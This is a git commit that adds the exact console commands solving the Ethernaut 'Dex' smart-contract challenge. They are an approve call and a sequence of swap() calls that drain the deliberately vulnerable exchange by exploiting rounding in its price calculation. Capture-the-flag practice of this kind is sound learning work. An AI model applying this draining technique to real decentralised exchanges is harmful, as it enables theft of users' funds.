bb1f571681f8bd0bb7fb8f75f452c706f1735ecb
Stefan Lehmann <85541624+Stefan1612@users.noreply.github.com>
2022-08-01 17:46:52 +0200

    Update Solution.sol

--- Ethernaut Challenge 22-Dex/Solution.sol
+++ Ethernaut Challenge 22-Dex/Solution.sol
@@ -11,5 +11,19 @@ Solution:
 Keep on calling swap() with all your available tokens -> due to the rounding you will keep
 ending up with more tokens than you should. After a certain amount of swaps you will end having all tokens of one kind.
 
+The actual code:
+
+1. await contract.approve(contract.address, 500)
+
+2. t1 = await contract.token1()
+   t2 = await contract.token2()
+
+3. await contract.swap(t1, t2, 10)
+  await contract.swap(t1, t2, 20)
+  await contract.swap(t1, t2, 24)
+  await contract.swap(t1, t2, 30)
+  await contract.swap(t1, t2, 41)
+  await contract.swap(t1, t2, 45)
+
 
 */
